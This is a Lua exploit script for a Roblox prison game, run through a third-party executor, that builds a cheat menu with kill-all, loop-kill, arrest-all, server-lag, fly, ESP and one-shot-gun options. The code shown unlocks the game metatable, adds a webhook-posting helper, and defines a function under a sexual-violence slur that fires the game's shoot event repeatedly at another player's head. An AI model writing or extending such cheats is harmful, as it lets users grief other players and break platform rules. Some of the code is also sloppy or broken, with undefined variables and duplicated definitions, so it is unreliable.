game.Players.LocalPlayer.OsPlatform = "Project Anti Abusers"

if not syn then return game:Shutdown()
end

if _G.loaded then
	game.CoreGui["Project Anti Abusers"]:Destroy()
	game.CoreGui.ScreenGui:Destroy()
	_G.loaded = false
end

if not isfolder("antiabusers") then
	makefolder('anti abusers')
end

local ProjectAntiAbusers = {
	ProjectAntiAbusers = Instance.new("ScreenGui"),
	InvisFrame = Instance.new("Frame"),
	Background = Instance.new("Frame"),
	UICorner = Instance.new("UICorner"),
	MassButtonsFrame = Instance.new("Frame"),
	UICorner_2 = Instance.new("UICorner"),
	KillTeamText = Instance.new("TextLabel"),
	UICorner_3 = Instance.new("UICorner"),
	LoopKillTeamText = Instance.new("TextLabel"),
	UICorner_4 = Instance.new("UICorner"),
	KillTeamGuard = Instance.new("TextButton"),
	UICorner_5 = Instance.new("UICorner"),
	KillTeamInmate = Instance.new("TextButton"),
	UICorner_6 = Instance.new("UICorner"),
	KillTeamCrim = Instance.new("TextButton"),
	UICorner_7 = Instance.new("UICorner"),
	KillTeamNeutral = Instance.new("TextButton"),
	UICorner_8 = Instance.new("UICorner"),
	LoopKillGuard = Instance.new("TextButton"),
	UICorner_9 = Instance.new("UICorner"),
	LoopKillInmate = Instance.new("TextButton"),
	UICorner_10 = Instance.new("UICorner"),
	LoopKillNeutral = Instance.new("TextButton"),
	UICorner_11 = Instance.new("UICorner"),
	LoopKillCrim = Instance.new("TextButton"),
	UICorner_12 = Instance.new("UICorner"),
	KillAll = Instance.new("TextButton"),
	UICorner_13 = Instance.new("UICorner"),
	ArrestAll = Instance.new("TextButton"),
	UICorner_14 = Instance.new("UICorner"),
	KillAnnoyText = Instance.new("TextLabel"),
	UICorner_15 = Instance.new("UICorner"),
	LoopKillAnnoyText = Instance.new("TextLabel"),
	UICorner_16 = Instance.new("UICorner"),
	KillShieldUser = Instance.new("TextButton"),
	UICorner_17 = Instance.new("UICorner"),
	KillAmmorUser = Instance.new("TextButton"),
	UICorner_18 = Instance.new("UICorner"),
	LoopKillShieldUser = Instance.new("TextButton"),
	UICorner_19 = Instance.new("UICorner"),
	LoopKillAmmorUser = Instance.new("TextButton"),
	UICorner_20 = Instance.new("UICorner"),
	MakeAllCrimKill = Instance.new("TextButton"),
	UICorner_21 = Instance.new("UICorner"),
	MiscFunctionsFrame = Instance.new("Frame"),
	UICorner_22 = Instance.new("UICorner"),
	ppgun = Instance.new("TextButton"),
	UICorner_23 = Instance.new("UICorner"),
	listcrims = Instance.new("TextButton"),
	UICorner_24 = Instance.new("UICorner"),
	listinmate = Instance.new("TextButton"),
	UICorner_25 = Instance.new("UICorner"),
	listguards = Instance.new("TextButton"),
	UICorner_26 = Instance.new("UICorner"),
	listneutral = Instance.new("TextButton"),
	UICorner_27 = Instance.new("UICorner"),
	clicktp = Instance.new("TextButton"),
	UICorner_28 = Instance.new("UICorner"),
	lagserver = Instance.new("TextButton"),
	UICorner_29 = Instance.new("UICorner"),
	spamm9 = Instance.new("TextButton"),
	UICorner_30 = Instance.new("UICorner"),
	OpenGate = Instance.new("TextButton"),
	UICorner_31 = Instance.new("UICorner"),
	MusicFeedbackFrame = Instance.new("Frame"),
	MusicIDTextBox = Instance.new("TextBox"),
	LoopToggle = Instance.new("TextButton"),
	UICorner_32 = Instance.new("UICorner"),
	StopButton = Instance.new("TextButton"),
	UICorner_33 = Instance.new("UICorner"),
	PlayButton = Instance.new("TextButton"),
	UICorner_34 = Instance.new("UICorner"),
	BugIssuesTextBox = Instance.new("TextBox"),
	ReportButton = Instance.new("TextButton"),
	UICorner_35 = Instance.new("UICorner"),
	FeedbackTextBox = Instance.new("TextBox"),
	FeedbackButton = Instance.new("TextButton"),
	UICorner_36 = Instance.new("UICorner"),
	SuggestionTextBox = Instance.new("TextBox"),
	SuggestButton = Instance.new("TextButton"),
	UICorner_37 = Instance.new("UICorner"),
	UICorner_38 = Instance.new("UICorner"),
	ReportExploiterTextBox = Instance.new("TextBox"),
	ReportExploiterButton = Instance.new("TextButton"),
	UICorner_39 = Instance.new("UICorner"),
	OtherGuisFrame = Instance.new("Frame"),
	UICorner_40 = Instance.new("UICorner"),
	ChatLogger1 = Instance.new("TextButton"),
	UICorner_41 = Instance.new("UICorner"),
	ChatLogger2 = Instance.new("TextButton"),
	UICorner_42 = Instance.new("UICorner"),
	RemoteSpy = Instance.new("TextButton"),
	UICorner_43 = Instance.new("UICorner"),
	TeamStuffFrame = Instance.new("Frame"),
	UICorner_44 = Instance.new("UICorner"),
	JoinGuards = Instance.new("TextButton"),
	UICorner_45 = Instance.new("UICorner"),
	JoinNeutral = Instance.new("TextButton"),
	UICorner_46 = Instance.new("UICorner"),
	JoinFogTeam = Instance.new("TextButton"),
	UICorner_47 = Instance.new("UICorner"),
	JoinRedTeam = Instance.new("TextButton"),
	UICorner_48 = Instance.new("UICorner"),
	RGBRedTextBox = Instance.new("TextBox"),
	RGBGreenTextBox = Instance.new("TextBox"),
	RGBBlueTextBox = Instance.new("TextBox"),
	JoinCustomTeamRGB = Instance.new("TextButton"),
	UICorner_49 = Instance.new("UICorner"),
	JoinInmate = Instance.new("TextButton"),
	UICorner_50 = Instance.new("UICorner"),
	JoinCrim = Instance.new("TextButton"),
	UICorner_51 = Instance.new("UICorner"),
	JoinBlackTeam = Instance.new("TextButton"),
	UICorner_52 = Instance.new("UICorner"),
	JoinGreenTeam = Instance.new("TextButton"),
	UICorner_53 = Instance.new("UICorner"),
	BrickColourTextBox = Instance.new("TextBox"),
	JoinCustomTeamBrickColour = Instance.new("TextButton"),
	UICorner_54 = Instance.new("UICorner"),
	JoinCustomTeamRandom = Instance.new("TextButton"),
	UICorner_55 = Instance.new("UICorner"),
	TogglesFrame = Instance.new("Frame"),
	UICorner_56 = Instance.new("UICorner"),
	AutoRespawn = Instance.new("TextButton"),
	UICorner_57 = Instance.new("UICorner"),
	OnePunch = Instance.new("TextButton"),
	UICorner_58 = Instance.new("UICorner"),
	AntiTouch = Instance.new("TextButton"),
	UICorner_59 = Instance.new("UICorner"),
	InfJump = Instance.new("TextButton"),
	UICorner_60 = Instance.new("UICorner"),
	NoArrestCooldown = Instance.new("TextButton"),
	UICorner_61 = Instance.new("UICorner"),
	FullBright = Instance.new("TextButton"),
	UICorner_62 = Instance.new("UICorner"),
	RainbowBullet = Instance.new("TextButton"),
	UICorner_63 = Instance.new("UICorner"),
	OneShotGuns = Instance.new("TextButton"),
	UICorner_64 = Instance.new("UICorner"),
	RapidPunch = Instance.new("TextButton"),
	UICorner_65 = Instance.new("UICorner"),
	InfStamina = Instance.new("TextButton"),
	UICorner_66 = Instance.new("UICorner"),
	AntiTaze = Instance.new("TextButton"),
	UICorner_67 = Instance.new("UICorner"),
	InvisFling = Instance.new("TextButton"),
	UICorner_68 = Instance.new("UICorner"),
	Fly = Instance.new("TextButton"),
	UICorner_69 = Instance.new("UICorner"),
	CarFly = Instance.new("TextButton"),
	UICorner_70 = Instance.new("UICorner"),
	ESP = Instance.new("TextButton"),
	UICorner_71 = Instance.new("UICorner"),
	TopBar = Instance.new("Frame"),
	UICorner_72 = Instance.new("UICorner"),
	DiscordButton = Instance.new("TextButton"),
	TitleVersion = Instance.new("TextLabel"),
	TpStuffFrame = Instance.new("Frame"),
	UICorner_73 = Instance.new("UICorner"),
	BorderTp = Instance.new("TextButton"),
	UICorner_74 = Instance.new("UICorner"),
	NexusTp = Instance.new("TextButton"),
	UICorner_75 = Instance.new("UICorner"),
	BridgeBaseTp = Instance.new("TextButton"),
	UICorner_76 = Instance.new("UICorner"),
	CriminalBaseTp = Instance.new("TextButton"),
	UICorner_77 = Instance.new("UICorner"),
	SecretRoomTp = Instance.new("TextButton"),
	UICorner_78 = Instance.new("UICorner"),
	RoofTp = Instance.new("TextButton"),
	UICorner_79 = Instance.new("UICorner"),
	Sewers = Instance.new("TextButton"),
	UICorner_80 = Instance.new("UICorner"),
	CellsTp = Instance.new("TextButton"),
	UICorner_81 = Instance.new("UICorner"),
	UnusedAreaTp = Instance.new("TextButton"),
	UICorner_82 = Instance.new("UICorner"),
	WallTp = Instance.new("TextButton"),
	UICorner_83 = Instance.new("UICorner"),
	formakingthescrollingtabnicerdonotremoveomg = Instance.new("Frame"),
	UICorner_84 = Instance.new("UICorner"),
	ScrollingTabs = Instance.new("ScrollingFrame"),
	MusicFeedback = Instance.new("TextButton"),
	UICorner_85 = Instance.new("UICorner"),
	LocalFunctions = Instance.new("TextButton"),
	UICorner_86 = Instance.new("UICorner"),
	BringStuff = Instance.new("TextButton"),
	UICorner_87 = Instance.new("UICorner"),
	MiscFunctions = Instance.new("TextButton"),
	UICorner_88 = Instance.new("UICorner"),
	GunStuff = Instance.new("TextButton"),
	UICorner_89 = Instance.new("UICorner"),
	MassButton = Instance.new("TextButton"),
	UICorner_90 = Instance.new("UICorner"),
	TpStuff = Instance.new("TextButton"),
	UICorner_91 = Instance.new("UICorner"),
	GlobalButtons = Instance.new("TextButton"),
	UICorner_92 = Instance.new("UICorner"),
	TeamStuff = Instance.new("TextButton"),
	UICorner_93 = Instance.new("UICorner"),
	Toggles = Instance.new("TextButton"),
	UICorner_94 = Instance.new("UICorner"),
	OtherGUIs = Instance.new("TextButton"),
	UICorner_95 = Instance.new("UICorner"),
	KillAuraStuff = Instance.new("TextButton"),
	UICorner_96 = Instance.new("UICorner"),
	Keybinds = Instance.new("TextButton"),
	UICorner_97 = Instance.new("UICorner"),
	Credits = Instance.new("TextButton"),
	UICorner_98 = Instance.new("UICorner"),
	AdminStuff = Instance.new("TextButton"),
    UICorner_99 = Instance.new("UICorner"),
    AdminStuffFrame = Instance.new("Frame"),
	UICorner = Instance.new("UICorner"),
	MakeUserAdmin = Instance.new("TextButton"),
	UICorner_2 = Instance.new("UICorner"),
	AdminUsernameTextBox = Instance.new("TextBox"),
	SayCommands = Instance.new("TextButton"),
	UICorner_3 = Instance.new("UICorner"),
	ScrollingCommandsFrame = Instance.new("ScrollingFrame"),
	TextLabel = Instance.new("TextLabel"),
	UICorner_4 = Instance.new("UICorner"),
	TextLabel_2 = Instance.new("TextLabel"),
	UICorner_5 = Instance.new("UICorner"),
	TextLabel_3 = Instance.new("TextLabel"),
	UICorner_6 = Instance.new("UICorner"),
	TextLabel_4 = Instance.new("TextLabel"),
	UICorner_7 = Instance.new("UICorner"),
	TextLabel_5 = Instance.new("TextLabel"),
	UICorner_8 = Instance.new("UICorner"),
	TextLabel_6 = Instance.new("TextLabel"),
	UICorner_9 = Instance.new("UICorner"),
	TextLabel_7 = Instance.new("TextLabel"),
	UICorner_10 = Instance.new("UICorner"),
	TextLabel_8 = Instance.new("TextLabel"),
	UICorner_11 = Instance.new("UICorner"),
	TextLabel_9 = Instance.new("TextLabel"),
	UICorner_12 = Instance.new("UICorner"),
	TextLabel_10 = Instance.new("TextLabel"),
	UICorner_13 = Instance.new("UICorner"),
	TextLabel_11 = Instance.new("TextLabel"),
	UICorner_14 = Instance.new("UICorner"),
	TextLabel_12 = Instance.new("TextLabel"),
	UICorner_15 = Instance.new("UICorner"),
	TextLabel_13 = Instance.new("TextLabel"),
	UICorner_16 = Instance.new("UICorner"),
	ExtraPermStuff = Instance.new("TextButton"),
	UICorner_17 = Instance.new("UICorner"),
	BringStuffFrame = Instance.new("Frame"),
	UICorner_18 = Instance.new("UICorner"),
	makeallcrim = Instance.new("TextButton"),
	UICorner_19 = Instance.new("UICorner"),
	killallguards = Instance.new("TextButton"),
	UICorner_20 = Instance.new("UICorner"),
	BorderFrame = Instance.new("Frame"),
	makecrimtextbox = Instance.new("TextLabel"),
	UICorner_21 = Instance.new("UICorner"),
	makeguardcrim = Instance.new("TextButton"),
	UICorner_22 = Instance.new("UICorner"),
	makeinmatecrim = Instance.new("TextButton"),
	UICorner_23 = Instance.new("UICorner"),
	makeneutralcrim = Instance.new("TextButton"),
	UICorner_24 = Instance.new("UICorner"),
	BorderFrame_2 = Instance.new("Frame"),
	bringteamtextbox = Instance.new("TextLabel"),
	UICorner_25 = Instance.new("UICorner"),
	BringCopTeam = Instance.new("TextButton"),
	UICorner_26 = Instance.new("UICorner"),
	Bringinmate = Instance.new("TextButton"),
	UICorner_27 = Instance.new("UICorner"),
	Bringcrim = Instance.new("TextButton"),
	UICorner_28 = Instance.new("UICorner"),
	BringNeutralteam = Instance.new("TextButton"),
	UICorner_29 = Instance.new("UICorner"),
	CreditsFrame = Instance.new("Frame"),
	UICorner_30 = Instance.new("UICorner"),
	Frame = Instance.new("Frame"),
	Frame_2 = Instance.new("Frame"),
	TextLabel_14 = Instance.new("TextLabel"),
	TextLabel_15 = Instance.new("TextLabel"),
	TextLabel_16 = Instance.new("TextLabel"),
	UICorner_31 = Instance.new("UICorner"),
	TextLabel_17 = Instance.new("TextLabel"),
	UICorner_32 = Instance.new("UICorner"),
	TextLabel_18 = Instance.new("TextLabel"),
	UICorner_33 = Instance.new("UICorner"),
	GlobalButtonsFrame = Instance.new("Frame"),
	UICorner_34 = Instance.new("UICorner"),
	UsernameTextBox = Instance.new("TextBox"),
	KillPlayer = Instance.new("TextButton"),
	UICorner_35 = Instance.new("UICorner"),
	TazePlayer = Instance.new("TextButton"),
	UICorner_36 = Instance.new("UICorner"),
	BringPlayer = Instance.new("TextButton"),
	UICorner_37 = Instance.new("UICorner"),
	ArrestPlayer = Instance.new("TextButton"),
	UICorner_38 = Instance.new("UICorner"),
	MakeCrimKill = Instance.new("TextButton"),
	UICorner_39 = Instance.new("UICorner"),
	MakeCrimBring = Instance.new("TextButton"),
	UICorner_40 = Instance.new("UICorner"),
	TrapPlayer = Instance.new("TextButton"),
	UICorner_41 = Instance.new("UICorner"),
	DropPlayer = Instance.new("TextButton"),
	UICorner_42 = Instance.new("UICorner"),
	VoidPlayer = Instance.new("TextButton"),
	UICorner_43 = Instance.new("UICorner"),
	LoopKillPlayer = Instance.new("TextButton"),
	UICorner_44 = Instance.new("UICorner"),
	SpamArrest = Instance.new("TextButton"),
	UICorner_45 = Instance.new("UICorner"),
	ViewPlayer = Instance.new("TextButton"),
	UICorner_46 = Instance.new("UICorner"),
	UserInfo = Instance.new("TextButton"),
	UICorner_47 = Instance.new("UICorner"),
	Who = Instance.new("TextButton"),
	UICorner_48 = Instance.new("UICorner"),
	TpToPlayer = Instance.new("TextButton"),
	UICorner_49 = Instance.new("UICorner"),
	SuicideStuffFrame = Instance.new("Frame"),
	SuicideKnife = Instance.new("TextButton"),
	UICorner_50 = Instance.new("UICorner"),
	SuicideGun = Instance.new("TextButton"),
	UICorner_51 = Instance.new("UICorner"),
	WriteInfo = Instance.new("TextButton"),
	UICorner_52 = Instance.new("UICorner"),
	GunstuffFrame = Instance.new("Frame"),
	UICorner_53 = Instance.new("UICorner"),
	giveallgunsbutton = Instance.new("TextButton"),
	UICorner_54 = Instance.new("UICorner"),
	givegunsorderButton = Instance.new("TextButton"),
	UICorner_55 = Instance.new("UICorner"),
	autogunspawn = Instance.new("TextButton"),
	UICorner_56 = Instance.new("UICorner"),
	infammo = Instance.new("TextButton"),
	UICorner_57 = Instance.new("UICorner"),
	gunmods = Instance.new("TextButton"),
	UICorner_58 = Instance.new("UICorner"),
	orderinfoTextLabel = Instance.new("TextLabel"),
	UICorner_59 = Instance.new("UICorner"),
	KeyBindsFrame = Instance.new("Frame"),
	UICorner_60 = Instance.new("UICorner"),
	Q = Instance.new("TextLabel"),
	UICorner_61 = Instance.new("UICorner"),
	E = Instance.new("TextLabel"),
	UICorner_62 = Instance.new("UICorner"),
	T = Instance.new("TextLabel"),
	UICorner_63 = Instance.new("UICorner"),
	Z = Instance.new("TextLabel"),
	UICorner_64 = Instance.new("UICorner"),
	X = Instance.new("TextLabel"),
	UICorner_65 = Instance.new("UICorner"),
	TextLabel_19 = Instance.new("TextLabel"),
	UICorner_66 = Instance.new("UICorner"),
	TextLabel_20 = Instance.new("TextLabel"),
	UICorner_67 = Instance.new("UICorner"),
	autorespawn = Instance.new("TextLabel"),
	UICorner_68 = Instance.new("UICorner"),
	noclip = Instance.new("TextLabel"),
	UICorner_69 = Instance.new("UICorner"),
	Gunspawn = Instance.new("TextLabel"),
	UICorner_70 = Instance.new("UICorner"),
	rapidfire = Instance.new("TextLabel"),
	UICorner_71 = Instance.new("UICorner"),
	fixui = Instance.new("TextLabel"),
	UICorner_72 = Instance.new("UICorner"),
	fixui_2 = Instance.new("TextLabel"),
	UICorner_73 = Instance.new("UICorner"),
	Focusonadmin = Instance.new("TextLabel"),
	UICorner_74 = Instance.new("UICorner"),
	KillAuraTogglesFrame = Instance.new("Frame"),
	UICorner_75 = Instance.new("UICorner"),
	KillAura = Instance.new("TextButton"),
	UICorner_76 = Instance.new("UICorner"),
	KillAuraCrim = Instance.new("TextButton"),
	UICorner_77 = Instance.new("UICorner"),
	KillAuraPris = Instance.new("TextButton"),
	UICorner_78 = Instance.new("UICorner"),
	KillAuraGuards = Instance.new("TextButton"),
	UICorner_79 = Instance.new("UICorner"),
	KillAuraSkids = Instance.new("TextButton"),
	UICorner_80 = Instance.new("UICorner"),
	DeathAura = Instance.new("TextButton"),
	UICorner_81 = Instance.new("UICorner"),
	AnnoyAura = Instance.new("TextButton"),
	UICorner_82 = Instance.new("UICorner"),
	LocalFunctionsFrame = Instance.new("Frame"),
	UICorner_83 = Instance.new("UICorner"),
	rejoin = Instance.new("TextButton"),
	UICorner_84 = Instance.new("UICorner"),
	doorremove = Instance.new("TextButton"),
	UICorner_85 = Instance.new("UICorner"),
	watergun = Instance.new("TextButton"),
	UICorner_86 = Instance.new("UICorner"),
	raincar = Instance.new("TextButton"),
	UICorner_87 = Instance.new("UICorner"),
	delseat = Instance.new("TextButton"),
	UICorner_88 = Instance.new("UICorner"),
	showping = Instance.new("TextButton"),
	UICorner_89 = Instance.new("UICorner"),
	ScriptTextBox = Instance.new("TextBox"),
	UICorner_90 = Instance.new("UICorner"),
	textlabelforexecutescriptomg = Instance.new("TextLabel"),
	UICorner_91 = Instance.new("UICorner"),
	Execute = Instance.new("TextButton"),
	UICorner_92 = Instance.new("UICorner"),
	saverespawn = Instance.new("TextButton"),
	UICorner_93 = Instance.new("UICorner"),
	infzoomout = Instance.new("TextButton"),
	UICorner_94 = Instance.new("UICorner"),
	btools = Instance.new("TextButton"),
	UICorner_95 = Instance.new("UICorner"),
}

ProjectAntiAbusers.ProjectAntiAbusers.Name = "Project Anti Abusers"
ProjectAntiAbusers.ProjectAntiAbusers.Parent = game.CoreGui
setreadonly(getrawmetatable(game), false)

function sFLY(vfly)
	FLYING = false
	speedofthefly = 1
	speedofthevfly = 1
	while not game.Players.LocalPlayer or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or not cmdlp.Character:FindFirstChild('Humanoid') or not cmdm do
		 wait()
	end 
	local T = game.Players.LocalPlayer.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			while FLYING do
				if not vfly then
					game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
				wait()
			end
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
		end)
	end
	game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			if vfly then
				CONTROL.F = speedofthevfly
			else
				CONTROL.F = speedofthefly
			end
		elseif KEY:lower() == 's' then
			if vfly then
				CONTROL.B = - speedofthevfly
			else
				CONTROL.B = - speedofthefly
			end
		elseif KEY:lower() == 'a' then
			if vfly then
				CONTROL.L = - speedofthevfly
			else
				CONTROL.L = - speedofthefly
			end
		elseif KEY:lower() == 'd' then
			if vfly then
				CONTROL.R = speedofthevfly
			else
				CONTROL.R = speedofthefly
			end
		elseif KEY:lower() == 'y' then
			if vfly then
				CONTROL.Q = speedofthevfly*2
			else
				CONTROL.Q = speedofthefly*2
			end
		elseif KEY:lower() == 't' then
			if vfly then
				CONTROL.E = -speedofthevfly*2
			else
				CONTROL.E = -speedofthefly*2
			end
		end
	end)
	game.Players.LocalPlayer:GetMouse().KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'y' then
			CONTROL.Q = 0
		elseif KEY:lower() == 't' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

local function sendweb(webhook, message)
    req = request or syn.request
	
	
	local response = req(
		{
			Url = webhook,
			Method = 'POST',
			Headers = {
				['Content-Type'] = 'application/json'
			},
			Body = game:GetService('HttpService'):JSONEncode({content = tostring(message)})
		}
	);
end

local plrs = game:GetService("Players")
local lplr = plrs.LocalPlayer
local function RemoveSpaces(String)
	return String:gsub("%s+", "") or String
end

local function FindPlayer(String)
	String = RemoveSpaces(String)
	for _, _Player in pairs(plrs:GetPlayers()) do
		if _Player.Name:lower():match('^'..String:lower()) then
			return _Player
		end
	end
	return nil
end

function getGun(dir)
	for _, v in pairs(dir:GetChildren()) do
		if v:IsA("Tool") and v.Name == "M9" then
			guns = v
			return
		end
	end
end

function GetTeamMembers(...)
    teams = {}
    for _, teamName in pairs{...} do
        local team = game.Teams:FindFirstChild(teamName)
        if team then
            local playersOnTeam = {}
            local teamColor = team.TeamColor
            for i, player in pairs(game.Players:GetPlayers()) do
                if player.TeamColor == teamColor then
                    table.insert(playersOnTeam, player.Name)
                end
            end
            table.insert(teams, playersOnTeam)
        end
    end
    return unpack(teams)
end

local cops, pris, skids, crims = GetTeamMembers("Guards", "Inmates", "Neutral", "Criminals")
local CopAmount = #cops
local prisamount = #pris
local skidamount = #skids
local crimamount = #crims

local plrs = game.Players
local lplr = plrs.LocalPlayer
local function RemoveSpaces(String)
    return string:gsub("%s+", "") or String
end

function rape(v)
    workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
	getGun(game.Players.LocalPlayer.Backpack)
	getGun(game.Players.LocalPlayer.Character)
	if v.Character:FindFirstChild("HumanoidRootPart") then
		pcall(
			function()
				local i = 1
				if not guns then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS["M9"].ITEMPICKUP)
				end
				while v.Character.Humanoid.Health > 0 and i < 100 do
					i = i + 1
					args = {
						[1] = {
							[1] = {
								["RayObject"] = Ray.new(),
								["Distance"] = 1,
								["Cframe"] = CFrame.new(),
								["Hit"] = v.Character.Head,
							},
						},
						[2] = guns,
					}
					game.ReplicatedStorage.ShootEvent:FireServer(unpack(args))
				end
			end
		)
	end
	guns = nil
end

ProjectAntiAbusers.InvisFrame.Name = "InvisFrame"
ProjectAntiAbusers.InvisFrame.Parent = ProjectAntiAbusers.ProjectAntiAbusers
ProjectAntiAbusers.InvisFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.InvisFrame.BackgroundTransparency = 1.000
ProjectAntiAbusers.InvisFrame.BorderSizePixel = 0
ProjectAntiAbusers.InvisFrame.Position = UDim2.new(0.294776112, 0, 0.289241731, 0)
ProjectAntiAbusers.InvisFrame.Size = UDim2.new(0, 512, 0, 260)
ProjectAntiAbusers.InvisFrame.Visible = true
ProjectAntiAbusers.InvisFrame.Active = true
ProjectAntiAbusers.InvisFrame.Draggable = true

ProjectAntiAbusers.Background.Name = "Background"
ProjectAntiAbusers.Background.Parent = ProjectAntiAbusers.InvisFrame
ProjectAntiAbusers.Background.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProjectAntiAbusers.Background.BorderSizePixel = 0
ProjectAntiAbusers.Background.Size = UDim2.new(0, 512, 0, 260)

ProjectAntiAbusers.UICorner.Parent = ProjectAntiAbusers.Background

ProjectAntiAbusers.MassButtonsFrame.Name = "MassButtonsFrame"
ProjectAntiAbusers.MassButtonsFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.MassButtonsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.MassButtonsFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.MassButtonsFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.MassButtonsFrame.Visible = false

ProjectAntiAbusers.UICorner_2.Parent = ProjectAntiAbusers.MassButtonsFrame

ProjectAntiAbusers.KillTeamText.Name = "KillTeamText"
ProjectAntiAbusers.KillTeamText.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillTeamText.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillTeamText.Position = UDim2.new(0.0275689214, 0, 0.0296610165, 0)
ProjectAntiAbusers.KillTeamText.Size = UDim2.new(0, 185, 0, 22)
ProjectAntiAbusers.KillTeamText.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillTeamText.Text = "Kill Teams"
ProjectAntiAbusers.KillTeamText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillTeamText.TextSize = 21.000

ProjectAntiAbusers.UICorner_3.Parent = ProjectAntiAbusers.KillTeamText

ProjectAntiAbusers.LoopKillTeamText.Name = "LoopKillTeamText"
ProjectAntiAbusers.LoopKillTeamText.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillTeamText.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillTeamText.Position = UDim2.new(0.51879698, 0, 0.0296610165, 0)
ProjectAntiAbusers.LoopKillTeamText.Size = UDim2.new(0, 185, 0, 22)
ProjectAntiAbusers.LoopKillTeamText.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillTeamText.Text = "Loop Kill Teams"
ProjectAntiAbusers.LoopKillTeamText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LoopKillTeamText.TextSize = 21.000

ProjectAntiAbusers.UICorner_4.Parent = ProjectAntiAbusers.LoopKillTeamText

ProjectAntiAbusers.KillTeamGuard.Name = "KillTeamGuard"
ProjectAntiAbusers.KillTeamGuard.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillTeamGuard.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillTeamGuard.Position = UDim2.new(0.0300751887, 0, 0.165254235, 0)
ProjectAntiAbusers.KillTeamGuard.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.KillTeamGuard.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillTeamGuard.Text = "Guards"
ProjectAntiAbusers.KillTeamGuard.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillTeamGuard.TextSize = 18.000

ProjectAntiAbusers.UICorner_5.Parent = ProjectAntiAbusers.KillTeamGuard

ProjectAntiAbusers.KillTeamInmate.Name = "KillTeamInmate"
ProjectAntiAbusers.KillTeamInmate.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillTeamInmate.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillTeamInmate.Position = UDim2.new(0.2781955, 0, 0.161016941, 0)
ProjectAntiAbusers.KillTeamInmate.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.KillTeamInmate.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillTeamInmate.Text = "Inmates"
